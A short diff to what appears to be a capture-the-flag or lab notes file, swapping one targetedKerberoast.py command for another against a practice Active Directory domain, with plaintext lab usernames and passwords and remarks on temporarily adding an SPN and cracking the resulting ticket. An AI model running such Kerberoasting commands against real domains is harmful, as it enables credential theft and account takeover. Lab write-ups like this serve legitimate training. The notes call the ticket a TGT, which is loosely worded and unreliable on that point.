@@ -9,7 +9,7 @@
 Added an SPN to for user "jerry_lancaster" temporarily and retrieved his TGT.
 
 ```
-python3 targetedKerberoast.py -v -d 'thm.local' -u 'ZACHARY_HUNT' -p 'MKO)mko0' --dc-host ad.thm.local --request-user JERRI_LANCASTER
+python3 /opt/arsenal/ActiveDirectory/targetedKerberoast/targetedKerberoast.py -v -d 'painters.htb' -u 'riley' -p 'P@ssw0rd' --dc-host dc.painters-htb --request-user web_svc
 ```
 
 Bruteforced an password out of the TGT
